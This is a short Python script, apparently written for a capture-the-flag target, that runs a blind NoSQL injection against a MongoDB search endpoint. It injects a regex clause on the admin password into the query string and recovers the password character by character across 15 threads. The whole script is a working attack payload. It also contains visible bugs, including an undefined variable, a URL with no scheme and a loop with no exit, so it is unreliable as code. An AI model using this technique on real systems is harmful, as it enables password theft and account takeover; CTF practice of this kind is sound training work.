from requests import Session
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor

class MongoBrute:
    def __init__(self):
        self.browser = Session()
        self.brutelist = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-'
        self.text = ""
        self.tagname = "a"
        self.tagstring = "admin"
        self.websitename = "SOMERANDOMCTF.com/"

    def seturl(self, text):
        url = self.websitename + '?search=admin%27%20%26%26%20this.password.match(/^' + text + '.*/)%00'
        return url

    def brute_single(self, chartext):
        vulnurl = self.seturl(self.text + chartext)
        response = BeautifulSoup(self.browser.get(vulnurl).text, 'html.parser')
        for link in response.find_all(self.tagname):
            nosqlistr = link.string
            if nosqlistr == tagstring:
                print(f"Char: {chartext}")
                self.text += chartext
        print(f"Text: {self.text}")

NoSQLi = MongoBrute()
while True:
    with ThreadPoolExecutor(max_workers=15) as mapper:
        mapper.map(NoSQLi.brute_single, NoSQLi.brutelist)
